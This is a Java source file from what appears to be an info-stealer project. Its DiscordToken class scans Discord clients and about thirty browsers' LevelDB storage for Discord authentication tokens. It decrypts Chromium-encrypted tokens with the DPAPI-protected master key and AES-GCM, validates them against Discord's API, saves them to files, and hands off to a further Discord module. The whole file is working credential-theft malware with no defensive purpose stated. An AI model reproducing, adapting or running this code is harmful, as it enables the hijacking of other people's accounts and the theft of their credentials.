package itzgonza.hollyshit.impl.browser;

import java.io.File;
import java.nio.ByteBuffer;
import java.nio.charset.StandardCharsets;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Base64;
import java.util.List;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import javax.crypto.Cipher;
import javax.crypto.spec.GCMParameterSpec;
import javax.crypto.spec.SecretKeySpec;

import org.apache.commons.io.FileUtils;

import com.google.gson.JsonObject;
import com.google.gson.JsonParser;
import com.sun.jna.platform.win32.Crypt32Util;

import itzgonza.hollyshit.utils.utilities;

public class DiscordToken extends utilities {

    private static final Pattern ENCRYPTED_TOKEN_PATTERN = Pattern.compile("dQw4w9WgXcQ:[^\"\\s]+");
    private static final Pattern PLAIN_TOKEN_PATTERN = Pattern.compile("[\\w-]{24,27}\\.[\\w-]{6,7}\\.[\\w-]{25,110}");

    private static final String ROAMING = System.getenv("APPDATA");
    private static final String LOCAL = System.getenv("LOCALAPPDATA");

    private static final String[][] DISCORD_PATHS = {
        {"Discord", ROAMING + "/discord"},
        {"Discord Canary", ROAMING + "/discordcanary"},
        {"Discord PTB", ROAMING + "/discordptb"},
        {"Lightcord", ROAMING + "/Lightdiscord"},
        {"Brave", LOCAL + "/BraveSoftware/Brave-Browser/User Data"},
        {"Brave Beta", LOCAL + "/BraveSoftware/Brave-Browser-Beta/User Data"},
        {"Brave Dev", LOCAL + "/BraveSoftware/Brave-Browser-Dev/User Data"},
        {"Brave Nightly", LOCAL + "/BraveSoftware/Brave-Browser-Nightly/User Data"},
        {"Chrome", LOCAL + "/Google/Chrome/User Data"},
        {"Chrome Beta", LOCAL + "/Google/Chrome Beta/User Data"},
        {"Chrome Dev", LOCAL + "/Google/Chrome Dev/User Data"},
        {"Chrome Canary", LOCAL + "/Google/Chrome SxS/User Data"},
        {"Edge", LOCAL + "/Microsoft/Edge/User Data"},
        {"Edge Beta", LOCAL + "/Microsoft/Edge Beta/User Data"},
        {"Edge Dev", LOCAL + "/Microsoft/Edge Dev/User Data"},
        {"Edge Canary", LOCAL + "/Microsoft/Edge Canary/User Data"},
        {"Opera", ROAMING + "/Opera Software/Opera Stable"},
        {"Opera GX", ROAMING + "/Opera Software/Opera GX Stable"},
        {"Opera Beta", ROAMING + "/Opera Software/Opera Beta"},
        {"Opera Developer", ROAMING + "/Opera Software/Opera Developer"},
        {"Vivaldi", LOCAL + "/Vivaldi/User Data"},
        {"Yandex", LOCAL + "/Yandex/YandexBrowser/User Data"},
        {"Firefox", ROAMING + "/Mozilla/Firefox/Profiles"},
        {"Firefox ESR", ROAMING + "/Mozilla/Firefox ESR/Profiles"},
        {"Tor Browser", ROAMING + "/Tor Browser/Browser/TorBrowser/Data/Browser/profile.default"},
        {"Arc", LOCAL + "/The Browser Company/Arc/User Data"},
        {"Sidekick", LOCAL + "/Mecha/Sidekick/User Data"},
        {"Coc Coc", LOCAL + "/Coc Coc/Browser/User Data"},
        {"Cent Browser", LOCAL + "/CentBrowser/User Data"},
        {"Safari", ROAMING + "/Apple Computer/Safari"}
    };

    public static List<String> tokens = new ArrayList<>();

    @Override
    public void initialize() throws Exception {
        for (String[] pathInfo : DISCORD_PATHS) {
            String path = pathInfo[1];
            File rootDir = new File(path);
            if (!rootDir.exists()) continue;

            // Deep scan for LevelDB folders (Local Storage + Session Storage)
            List<File> levelDbDirs = new ArrayList<>();
            findLevelDbDirs(rootDir, levelDbDirs);

            // Master key is folder-specific for Chromium browsers
            byte[] masterKey = getMasterKey(path);
            
            for (File levelDbDir : levelDbDirs) {
                File[] files = levelDbDir.listFiles();
                if (files == null) continue;

                for (File file : files) {
                    if (!file.getName().endsWith(".ldb") && !file.getName().endsWith(".log")) continue;

                    try {
                        // Create temp copy to avoid file lock
                        File tempFile = File.createTempFile("leveldb_", ".tmp");
                        FileUtils.copyFile(file, tempFile);
                        
                        String content = FileUtils.readFileToString(tempFile, StandardCharsets.UTF_8);
                        FileUtils.deleteQuietly(tempFile);
                        
                        // Check for encrypted tokens (Chromium v10+)
                        if (masterKey != null) {
                            Matcher matcher = ENCRYPTED_TOKEN_PATTERN.matcher(content);
                            while (matcher.find()) {
                                String encrypted = matcher.group();
                                String decrypted = decryptToken(encrypted, masterKey);
                                if (decrypted != null && !tokens.contains(decrypted)) {
                                    tokens.add(decrypted);
                                    System.out.println("[TOKEN] Found encrypted in " + pathInfo[0]);
                                }
                            }
                        }

                        // Check for plain tokens (Legacy/Firefox/Other)
                        Matcher plainMatcher = PLAIN_TOKEN_PATTERN.matcher(content);
                        while (plainMatcher.find()) {
                            String token = plainMatcher.group();
                            if (!tokens.contains(token)) {
                                tokens.add(token);
                                System.out.println("[TOKEN] Found plain in " + pathInfo[0]);
                            }
                        }
                    } catch (Exception ignored) {}
                }
            }

        }

        // Validate tokens, separate valid/invalid, save to files
        if (!tokens.isEmpty()) {
            try {
                List<String> uniqueTokens = tokens.stream().distinct().collect(java.util.stream.Collectors.toList());
                List<String> validTokens   = new ArrayList<>();
                List<String> invalidTokens = new ArrayList<>();

                System.out.println("[TOKEN] " + uniqueTokens.size() + " unique token kontrol ediliyor...");

                for (String token : uniqueTokens) {
                    if (isTokenValid(token)) {
                        validTokens.add(token);
                        System.out.println("[TOKEN] ✓ GEÇERLI: " + token.substring(0, Math.min(20, token.length())) + "...");
                    } else {
                        invalidTokens.add(token);
                        System.out.println("[TOKEN] ✗ GEÇERSİZ: " + token.substring(0, Math.min(20, token.length())) + "...");
                    }
                }

                // Save valid tokens
                if (!validTokens.isEmpty()) {
                    FileUtils.writeLines(new File(getFolder(), "discord_tokens_valid.txt"), validTokens);
                    System.out.println("[INFO] " + validTokens.size() + " geçerli token kaydedildi.");

                    // Initialize DiscordApp with first valid token so embed fills correctly
                    try {
                        new itzgonza.hollyshit.impl.app.DiscordApp().initialize();
                    } catch (Exception ignored) {}
                }

                // Save invalid tokens
                if (!invalidTokens.isEmpty()) {
                    FileUtils.writeLines(new File(getFolder(), "discord_tokens_invalid.txt"), invalidTokens);
                    System.out.println("[INFO] " + invalidTokens.size() + " geçersiz token kaydedildi.");
                }

                // Keep backward compat — write all to original file too
                FileUtils.writeLines(new File(getFolder(), "discord_tokens.txt"), uniqueTokens);

            } catch (Exception ignored) {}
        }
    }

    /**
     * Validates a Discord token by calling the users/@me endpoint.
     * Returns true if the API responds with HTTP 200.
     */
    private boolean isTokenValid(String token) {
        try {
            java.net.URL url = new java.net.URL("https://discord.com/api/v9/users/@me");
            java.net.HttpURLConnection conn = (java.net.HttpURLConnection) url.openConnection();
            conn.setRequestMethod("GET");
            conn.setRequestProperty("Authorization", token);
            conn.setRequestProperty("User-Agent",
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36");
            conn.setConnectTimeout(5000);
            conn.setReadTimeout(5000);
            int code = conn.getResponseCode();
            conn.disconnect();
            return code == 200;
        } catch (Exception e) {
            return false;
        }
    }


    private void findLevelDbDirs(File root, List<File> results) {
        if (root.getName().equalsIgnoreCase("leveldb")) {
            results.add(root);
            // Don't return, keep searching for other leveldb folders (e.g. Session Storage)
        }
        File[] children = root.listFiles();
        if (children == null) return;
        for (File child : children) {
            if (child.isDirectory()) {
                // Skip common system/temp folders to speed up
                String name = child.getName().toLowerCase();
                if (name.equals("windows") || name.equals("temp") || name.equals("node_modules")) continue;
                findLevelDbDirs(child, results);
            }
        }
    }

    private byte[] getMasterKey(String path) {
        try {
            File localStateFile = new File(path, "Local State");
            // Also check parent directory for some Chromium structures
            if (!localStateFile.exists()) {
                localStateFile = new File(new File(path).getParent(), "Local State");
            }
            if (!localStateFile.exists()) return null;

            String content = FileUtils.readFileToString(localStateFile, StandardCharsets.UTF_8);
            JsonObject json = JsonParser.parseString(content).getAsJsonObject();
            String encryptedKey = json.getAsJsonObject("os_crypt").get("encrypted_key").getAsString();

            byte[] keyBytes = Base64.getDecoder().decode(encryptedKey);
            byte[] encryptedKeyData = Arrays.copyOfRange(keyBytes, 5, keyBytes.length);
            return Crypt32Util.cryptUnprotectData(encryptedKeyData);
        } catch (Exception e) {
            return null;
        }
    }

    private String decryptToken(String encryptedToken, byte[] key) {
        try {
            String[] parts = encryptedToken.split("dQw4w9WgXcQ:");
            byte[] encryptedData = Base64.getDecoder().decode(parts[1]);
            byte[] iv = Arrays.copyOfRange(encryptedData, 3, 15);
            byte[] ciphertext = Arrays.copyOfRange(encryptedData, 15, encryptedData.length - 16);
            byte[] tag = Arrays.copyOfRange(encryptedData, encryptedData.length - 16, encryptedData.length);

            Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");
            SecretKeySpec keySpec = new SecretKeySpec(key, "AES");
            GCMParameterSpec gcmSpec = new GCMParameterSpec(128, iv);
            cipher.init(Cipher.DECRYPT_MODE, keySpec, gcmSpec);

            // GCM auth tag handling in Java (combined with ciphertext usually)
            byte[] decrypted = cipher.doFinal(ByteBuffer.allocate(ciphertext.length + tag.length).put(ciphertext).put(tag).array());
            return new String(decrypted, StandardCharsets.UTF_8);
        } catch (Exception e) {
            return null;
        }
    }
}
